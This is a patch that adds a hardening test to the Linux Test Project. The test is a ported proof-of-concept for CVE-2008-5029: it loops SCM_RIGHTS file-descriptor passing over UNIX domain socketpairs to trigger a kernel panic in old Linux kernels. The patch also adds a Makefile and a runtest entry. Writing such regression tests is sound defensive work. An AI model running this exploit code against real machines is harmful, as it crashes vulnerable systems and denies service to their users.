diff -Naur ltp-full-20070228-orig/runtest/houndspk ltp-full-20070228-new/runtest/houndspk
--- ltp-full-20070228-orig/runtest/houndspk	2009-07-09 11:08:06.000000000 +0100
+++ ltp-full-20070228-new/runtest/houndspk	2009-07-09 11:10:24.000000000 +0100
@@ -1,4 +1,7 @@
 #DESCRIPTION:Math library tests - CPU tests
+
+cve-2008-5029 cve-2008-5029
+
 abs01 abs01
 
 atof01 atof01
diff -Naur ltp-full-20070228-orig/testcases/hardening/cve-2008-5029/cve-2008-5029.c ltp-full-20070228-new/testcases/hardening/cve-2008-5029/cve-2008-5029.c
--- ltp-full-20070228-orig/testcases/hardening/cve-2008-5029/cve-2008-5029.c	1970-01-01 01:00:00.000000000 +0100
+++ ltp-full-20070228-new/testcases/hardening/cve-2008-5029/cve-2008-5029.c	2009-07-09 17:11:05.000000000 +0100
@@ -0,0 +1,302 @@
+/*
+ *
+ *   Copyright (c) bSkyb 2009
+ *
+ */
+
+
+/*
+ * NAME
+ *	cve-2008-5029
+ *
+ * CALLS
+ *	-
+ *
+ * ALGORITHM
+ *	According to CVE description:
+ *	  "The __scm_destroy function in net/core/scm.c in the Linux kernel 2.6.27.4, 2.6.26,
+ *	   and earlier makes indirect recursive calls to itself through calls to the fput
+ *	   function, which allows local users to cause a denial of service (panic) via vectors
+ *	   related to sending an SCM_RIGHTS message through a UNIX domain socket and closing
+ *	   file descriptors." 
+ *
+ *	This test is based on the exploit code published here:
+ *	    https://bugzilla.redhat.com/attachment.cgi?id=322676
+ *
+ *	
+ *
+ * RESTRICTIONS
+ *      -
+ *
+ * CHANGE LOG:
+ * July 08 2009: Ported to LTP Suite by Ben
+ *
+ */
+
+
+#include <sys/socket.h>
+#include <sys/un.h>
+#include <unistd.h>
+#include <assert.h>
+#include <err.h>
+#include <stdlib.h>
+
+ /* test.h and usctest.h are the two header files that are required by the
+  * quickhit package.  They contain function and macro declarations which you
+  * can use in your test programs
+  */
+#include "test.h"
+#include "usctest.h"
+
+ /* The setup and cleanup functions are basic parts of a test case.  These
+  * steps are usually put in separate functions for clarity.  The help function
+  * is only needed when you are adding new command line options.
+  */
+void setup(); 
+void help();
+void cleanup();
+
+char *TCID = "cve-2008-5029";   /* Test program identifier.    */
+int TST_TOTAL=1;    		/* Total number of test cases. */
+extern int Tst_count;		/* Test Case counter for tst_* routines */
+
+
+
+
+/***************************************************************
+ * own_child(
+ ***************************************************************/
+/* Forked child used to send a message back to the orignal app
+ *
+ */
+static int own_child(int *us)
+{
+	int pid;
+	int s[2];
+	struct msghdr mh;
+	char crap[1024];
+	struct iovec iov;
+	struct cmsghdr *c;
+	int *fd;
+	int rc;
+	
+	pid = fork();
+
+	if (pid == -1) {
+		TEST_ERROR_LOG(TEST_ERRNO);
+		tst_brkm(TFAIL, cleanup, "fork failed.");
+		//err(1, "fork()");
+	}
+
+	if (pid) {
+		close(us[1]);
+		return pid;
+	}
+
+	close(us[0]);
+	
+	memset(&mh, 0, sizeof(mh));
+	
+	iov.iov_base = "a";
+	iov.iov_len = 1;
+	mh.msg_iov = &iov;
+	mh.msg_iovlen = 1;
+	mh.msg_control = crap;
+	mh.msg_controllen = sizeof(crap);
+	c = CMSG_FIRSTHDR(&mh);
+	if (!c)
+		tst_brkm(TFAIL, cleanup, "fork failed.");
+	//assert(c);
+
+	c->cmsg_level = SOL_SOCKET;
+	c->cmsg_type = SCM_RIGHTS;
+	fd = (int*) CMSG_DATA(c);
+	if (fd <= 0)
+		tst_brkm(TFAIL, cleanup, "fork failed.");
+	//assert(fd);
+	
+	c->cmsg_len = CMSG_LEN(sizeof(int));
+	mh.msg_controllen = c->cmsg_len;
+
+	while (1) {
+
+		if (socketpair(PF_UNIX, SOCK_STREAM, 0, s) == -1) {
+			TEST_ERROR_LOG(TEST_ERRNO);
+			tst_brkm(TFAIL, cleanup, "socketpair()");			
+			//err(1, "socketpair()");
+		}
+
+		*fd = s[0];
+
+		rc = sendmsg(us[1], &mh, 0);
+		if (rc == -1) {
+			TEST_ERROR_LOG(TEST_ERRNO);
+			tst_brkm(TFAIL, cleanup, "sendmsg()");
+			//err(1, "sendmsg()");
+		}
+
+		if (rc != iov.iov_len) {
+			tst_brkm(TFAIL, cleanup, "sent short");
+			//errx(1, "sent short");
+		}
+		close(s[0]);
+		close(us[1]);
+		us[1] = s[1];
+	}
+}
+
+
+/***************************************************************
+ * own
+ ***************************************************************/
+/* 
+ *
+ */
+static void own(void)
+{
+	static int pid;
+	static int us[2];
+	char crap[1024];
+	char morte[1024];
+	struct cmsghdr *c;
+	int rc;
+	struct msghdr mh;
+	struct iovec iov;
+	int *fds;
+	
+	if (!pid) {
+
+		if (socketpair(PF_UNIX, SOCK_STREAM, 0, us) == -1) {
+			tst_brkm(TFAIL, cleanup, "socketpair");
+			//err(1, "socketpair()");
+		}
+
+		pid = own_child(us);
+	}
+	
+	iov.iov_base = morte;
+	iov.iov_len = sizeof(morte);
+
+	memset(&mh, 0, sizeof(mh));
+	mh.msg_iov = &iov;
+	mh.msg_iovlen = 1;
+	mh.msg_control = crap;
+	mh.msg_controllen = sizeof(crap);
+
+	rc = recvmsg(us[0], &mh, 0);
+	if (rc == -1) {
+		tst_brkm(TFAIL, cleanup, "recvmsg()");
+		//err(1, "recvmsg()");
+	}
+	if (rc == 0) {
+		tst_brkm(TFAIL, cleanup, "EOF");
+		//errx(1, "EOF");
+	}
+
+	c = CMSG_FIRSTHDR(&mh);
+	if (!c)
+		tst_brkm(TFAIL, cleanup, "assert(c)");
+	if (c->cmsg_type != SCM_RIGHTS)
+		tst_brkm(TFAIL, cleanup, "assert(c->cmsg_type == SCM_RIGHTS)");
+	//assert(c);
+	//assert(c->cmsg_type == SCM_RIGHTS);
+
+	fds = (int*) CMSG_DATA(c);
+	if (!fds)
+		tst_brkm(TFAIL, cleanup, "assert(fds)");
+	//assert(fds);
+
+	close(us[0]);
+	us[0] = *fds;
+}
+
+
+/***************************************************************
+ * main
+ ***************************************************************/
+/* 
+ *
+ */
+int main(int argc, char *argv[])
+{
+	int lc;		        /* loop counter */
+	char *msg;		/* message returned from parse_opts */
+
+
+	/***************************************************************
+	 * parse standard options
+	 ***************************************************************/
+	/* start off by parsing the command line options.  We provide a function
+	 * that understands many common options to control looping.  If you are not
+	 * adding any new options, pass NULL in place of options and &help.
+	 */
+	if ( (msg=parse_opts(argc, argv, (option_t *)NULL, NULL)) != (char *)NULL )
+	{
+		tst_brkm(TBROK, NULL, "OPTION PARSING ERROR - %s", msg);
+		tst_exit();
+	}
+
+
+	/***************************************************************
+	 * check looping state 
+	 ***************************************************************/
+	/* TEST_LOOPING() is a macro that will make sure the test continues
+	 * looping according to the standard command line args. 
+	 */
+	for (lc=0; TEST_LOOPING(lc); lc++) {
+
+		own();
+	}
+
+	cleanup();
+
+	return 0;
+}
+
+
+
+/***************************************************************
+ * help
+ ***************************************************************/
+/* The custom help() function is really simple.  Just write your help message to
+ * standard out.  Your help function will be called after the standard options
+ * have been printed
+ */
+void
+help()
+{
+	
+}
+
+
+/***************************************************************
+ * setup() - performs all ONE TIME setup for this test.
+ ***************************************************************/
+void 
+setup()
+{
+	/* Pause if that option was specified */
+	/* One cavet that hasn't been fixed yet.  TEST_PAUSE contains the code to
+	 * fork the test with the -c option.  You want to make sure you do this
+	 * before you create your temporary directory.
+	 */
+	TEST_PAUSE;
+}
+
+/***************************************************************
+ * cleanup() - performs all ONE TIME cleanup for this test at
+ *		completion or premature exit.
+ ***************************************************************/
+void 
+cleanup()
+{
+	/*
+	 * print timing stats if that option was specified.
+	 * print errno log if that option was specified.
+	 */
+	TEST_CLEANUP;
+
+	/* exit with return code appropriate for results */
+	tst_exit();
+}
+
diff -Naur ltp-full-20070228-orig/testcases/hardening/cve-2008-5029/Makefile ltp-full-20070228-new/testcases/hardening/cve-2008-5029/Makefile
--- ltp-full-20070228-orig/testcases/hardening/cve-2008-5029/Makefile	1970-01-01 01:00:00.000000000 +0100
+++ ltp-full-20070228-new/testcases/hardening/cve-2008-5029/Makefile	2009-07-08 16:54:05.000000000 +0100
@@ -0,0 +1,22 @@
+#
+#  Copyright (c) bSkyb, 2009
+#
+#  Generic makefile for CVE patch tests.
+#
+#
+#
+#
+
+CFLAGS += -I../../../include -Wall
+LDLIBS += -L../../../lib -lltp
+
+SRCS    = $(wildcard *.c)
+TARGETS = $(patsubst %.c,%,$(SRCS))
+
+all: $(TARGETS)
+
+install:
+	@set -e; for i in $(TARGETS); do ln -f $$i ../../bin/$$i ; done
+
+clean:
+	rm -f $(TARGETS)
